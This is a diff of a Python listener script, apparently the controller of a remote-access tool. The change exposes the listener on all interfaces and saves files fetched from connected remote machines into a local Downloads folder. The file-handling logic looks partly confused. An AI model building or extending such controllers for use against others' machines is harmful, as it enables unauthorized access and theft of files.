@@ -4,8 +4,9 @@ import sys
 import time
 import random
 import threading
+import os
 
-HOST = "127.0.0.1" # Address to listen on
+HOST = "0.0.0.0" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
 
 connections = list() # List of active connections 
@@ -94,9 +95,14 @@ def download_file(conn, remote_path):
     if res == '0':
         print("\033[91m[WARN] The specified file doesn't exist\033[0m")
     elif res == '1':
-        print("\033[92m[INFO] File successfully downloaded\033[0m")
+        print("\033[91m[ERROR] These was a problem downloading the file\n\033[0m")
     else:
-        print("\033[91m[ERROR] These was a problem:\n", res, "\n\033[0m")
+        if not os.path.exists('Downloads'):
+            os.mkdir('Downloads')
+        filename = remote_path.split('\\')[-1]
+        f = open('Downloads\\'+filename, 'w')
+        f.write(res)
+        print("\033[96m[INFO] File successfully downloaded\033[0m")
 
     
 def listen_for_connections(server):
